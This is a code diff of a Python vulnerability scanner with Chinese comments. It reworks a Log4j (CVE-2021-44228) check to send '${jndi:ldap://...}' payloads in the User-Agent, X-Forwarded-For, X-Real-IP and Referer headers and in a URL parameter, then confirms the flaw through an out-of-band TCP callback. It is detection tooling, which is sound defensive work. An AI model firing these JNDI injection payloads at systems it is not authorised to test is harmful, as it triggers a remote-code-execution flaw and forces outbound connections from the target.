@@ -387,34 +387,88 @@ def detect_nacos(target: str, session, ruoyi_version: str = "") -> ComponentVers
 
 
 def detect_log4j(target: str, session, oast_client=None) -> ComponentVersionResult:
-    """Log4j 探测：需 OAST 带外回调确认（非破坏性，不自动 CONFIRMED）
+    """Log4j JNDI 探测：只做无破坏的 lookup 触发，回调即确认。
 
-    未启用 OAST 时返回 UNKNOWN + 提示（Log4j 为库级组件，无响应特征可探测存在性）。
+    为什么用 TCP 而不是 HTTP：
+      Log4j 的 ${jndi:ldap://...} 走 JNDI/LDAP，目标连接的是 TCP 端口，不是 HTTP。
+      OASTClient.new_tcp_interaction() 在临时端口上只记录连接和原始字节，不实现
+      LDAP 协议、不返回远程类，因此不会触发反序列化/远程加载；连接本身已能证明
+      表达式被 Log4j 求值。
+
+    三态：
+      CONFIRMED  收到 TCP 回调（带来源/字节数证据）
+      UNKNOWN    未启用 OAST，或 payload 已发出但未收到回调（不能判不存在）
     """
     if oast_client is None:
         return ComponentVersionResult(
             component="log4j",
             status=STATUS_UNKNOWN,
-            evidence="需带外回调（OAST）才能确认 JNDI 注入；当前未接线，按 UNKNOWN 处理",
+            unknown_reason="insufficient_evidence",
+            evidence="需带外回调（OAST）才能确认 JNDI 注入；未启用 --oast，按 UNKNOWN 处理",
         )
+
+    interaction = None
     try:
-        payload_url = oast_client.get_payload("log4j")
-        # 将 ${jndi:ldap://<callback>} payload 注入一个无害参数触发日志（非破坏性）
-        url = join_url(target, "/prod-api/system/user/list") + "?pageNum=${jndi:ldap://%s}" % payload_url
-        session.get(url)
-        if oast_client.wait_callback(interaction_id=payload_url, timeout=8):
+        interaction = oast_client.new_tcp_interaction()
+        payload = "${jndi:ldap://%s}" % interaction.jndi_url("ldap")
+        # 常见日志落点：UA / XFF / Referer 头，以及 URL 参数；只发无害 GET。
+        headers = {
+            "User-Agent": payload,
+            "X-Forwarded-For": payload,
+            "X-Real-IP": payload,
+            "Referer": payload,
+        }
+        probe_urls = [target, join_url(target, "/login")]
+        for probe in probe_urls:
+            try:
+                session.get(probe, headers=headers, timeout=min(float(getattr(session, "timeout", 10) or 10), 5.0))
+            except Exception:
+                # 单端点失败不阻断其它落点；回调仍可能由另一条请求触发
+                continue
+        try:
+            session.get(join_url(target, "/") + "?pageNum=" + payload, headers=headers)
+        except Exception:
+            pass
+
+        hit = interaction.wait(timeout=float(getattr(oast_client, "timeout", 8.0)))
+        if hit:
+            callbacks = interaction.callbacks()
+            first = callbacks[0] if callbacks else {}
             return ComponentVersionResult(
                 component="log4j",
-                status=STATUS_UNKNOWN,
-                url=url,
-                evidence="OAST 回调命中：疑似存在 Log4j JNDI 注入（需人工复核，不自动确认）",
+                status=STATUS_CONFIRMED,
+                url=interaction.jndi_url("ldap"),
+                evidence=(
+                    "OAST TCP 回调命中：JNDI lookup 已发生（来源 %s:%s，首包 %s 字节）；"
+                    "未加载远程类，仅确认表达式求值"
+                    % (first.get("from", "?"), first.get("port", "?"), first.get("bytes", "?"))
+                ),
                 cve="CVE-2021-44228",
                 fix_version="2.17.1+",
+                severity="high",
                 cvss_score=10.0,
+                compliance={"OWASP": "A06:2021", "等保2.0": "8.1.3"},
             )
-        return ComponentVersionResult(component="log4j", status=STATUS_UNKNOWN, evidence="OAST 未收到回调")
+        return ComponentVersionResult(
+            component="log4j",
+            status=STATUS_UNKNOWN,
+            unknown_reason="oast_no_callback",
+            url=interaction.jndi_url("ldap"),
+            evidence="Log4j JNDI payload 已发送，但 OAST 未收到 TCP 回调（不能据此判不存在）",
+        )
     except Exception as e:
-        return ComponentVersionResult(component="log4j", status=STATUS_UNKNOWN, evidence="探测异常: %s" % e)
+        return ComponentVersionResult(
+            component="log4j",
+            status=STATUS_UNKNOWN,
+            unknown_reason="unreachable",
+            evidence="Log4j OAST 探测异常: %s" % e,
+        )
+    finally:
+        if interaction is not None:
+            try:
+                interaction.close()
+            except Exception:
+                pass
 
 
 # 探测器注册表（保持执行顺序）
@@ -704,8 +758,10 @@ def to_scan_result(res: ComponentVersionResult) -> ScanResult:
     # 显式给出更精确的原因，显式值优先。
     def _component_unknown_reason(evidence: str) -> str:
         text = evidence or ""
-        if "网络异常" in text or "OAST 未收到回调" in text:
+        if "网络异常" in text:
             return UnknownReason.UNREACHABLE.value
+        if "OAST" in text and "回调" in text:
+            return UnknownReason.OAST_NO_CALLBACK.value
         return UnknownReason.INSUFFICIENT_EVIDENCE.value
 
     unknown_reason = ""
